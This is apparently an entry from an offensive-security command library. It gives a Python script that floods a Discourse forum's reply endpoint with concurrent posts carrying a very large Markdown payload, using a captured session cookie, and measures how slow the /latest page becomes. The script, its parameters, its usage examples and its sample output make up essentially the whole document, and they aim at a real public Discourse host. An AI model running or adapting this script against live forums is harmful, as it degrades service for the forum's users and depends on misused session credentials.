---
id: cmd-uuid-1
data: |-
  import requests
  import threading
  import time

  def send_payload():
      with open('payload.txt', 'r') as f:
          payload = f.read()
      data = {'post[raw]': payload}
      cookies = {'_forum_session': 'your_captured_session'}
      requests.post('https://try.discourse.org/t/welcome-to-discourse/1/posts', data=data, cookies=cookies)

  threads = [threading.Thread(target=send_payload) for _ in range(8)]
  for t in threads:
      t.start()
  for t in threads:
      t.join()

  start = time.time()
  requests.get('https://try.discourse.org/latest')
  print(f'/latest response time: {time.time() - start} seconds')
tags:
  - dos
  - automation
type: command
output: 'Example: /latest response time: 32.5 seconds'
executor: python
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:55.754Z'
verified: false
validated: true
submitted: true
---
# python-discourse-dos-script

## Command

```python
import requests
import threading
import time

def send_payload():
    with open('payload.txt', 'r') as f:
        payload = f.read()
    data = {'post[raw]': payload}
    cookies = {'_forum_session': 'your_captured_session'}
    requests.post('https://try.discourse.org/t/welcome-to-discourse/1/posts', data=data, cookies=cookies)

threads = [threading.Thread(target=send_payload) for _ in range(8)]
for t in threads:
    t.start()
for t in threads:
    t.join()

start = time.time()
requests.get('https://try.discourse.org/latest')
print(f'/latest response time: {time.time() - start} seconds')
```

## Description

This Python script automates sending 8 concurrent POST requests with a large Markdown payload to a Discourse reply endpoint, while timing a GET to /latest to measure impact. Use it to amplify DoS effects in testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload.txt | File containing ~800k char Markdown payload | Yes |
| _forum_session | Captured session cookie value | Yes |
| URL endpoints | Target reply and monitor URLs | Yes |
| thread count | Number of concurrent threads (default 8) | No |

## Examples

### Basic Usage

Save as discourse.py and run:

```bash
python discourse.py
```

### Advanced Usage

Modify thread count:

```python
threads = [threading.Thread(target=send_payload) for _ in range(10)]
```

## Expected Output

Script outputs response time for /latest, e.g., "/latest response time: 32.5 seconds", indicating delay if >2s.

## Related

- [[procedures/Automate-Concurrent-Requests-for-Amplified-DoS]]
